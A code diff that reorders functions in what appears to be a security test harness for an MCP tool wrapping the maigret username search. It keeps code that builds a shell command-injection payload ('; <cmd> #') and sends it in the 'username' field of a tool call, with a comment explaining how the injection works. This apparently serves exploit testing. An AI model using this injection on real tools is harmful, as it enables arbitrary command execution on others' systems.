@@ -83,11 +83,17 @@ KEPT_PLACES: tuple[str, ...] = (
 )
 
 
-def _file_paths(place: Place) -> tuple[str, ...]:
-    if place.coordinates.paths is not None:
-        return place.coordinates.paths
-    assert place.coordinates.path is not None
-    return (place.coordinates.path,)
+def _exploit(place_id: str) -> Callable[[Places, MCPClientPort], Awaitable[None]]:
+    async def run(places: Places, client: MCPClientPort) -> None:
+        await client.call_tool(TOOL, {"username": payload(places[place_id])})
+
+    return run
+
+
+def payload(place: Place) -> str:
+    # `; <cmd> #`: the leading `;` leaves the `docker run ... soxoj/maigret:latest` call with no
+    # username (maigret exits fast), then runs <cmd>; `#` comments out the trailing maigret flags.
+    return f"; {injection_command(place)} #"
 
 
 def injection_command(place: Place) -> str:
@@ -107,17 +113,11 @@ def injection_command(place: Place) -> str:
     raise ValueError(f"{place.id}: no injection for kind {kind}")
 
 
-def payload(place: Place) -> str:
-    # `; <cmd> #`: the leading `;` leaves the `docker run ... soxoj/maigret:latest` call with no
-    # username (maigret exits fast), then runs <cmd>; `#` comments out the trailing maigret flags.
-    return f"; {injection_command(place)} #"
-
-
-def _exploit(place_id: str) -> Callable[[Places, MCPClientPort], Awaitable[None]]:
-    async def run(places: Places, client: MCPClientPort) -> None:
-        await client.call_tool(TOOL, {"username": payload(places[place_id])})
-
-    return run
+def _file_paths(place: Place) -> tuple[str, ...]:
+    if place.coordinates.paths is not None:
+        return place.coordinates.paths
+    assert place.coordinates.path is not None
+    return (place.coordinates.path,)
 
 
 async def _benign(places: Places, client: MCPClientPort) -> None:
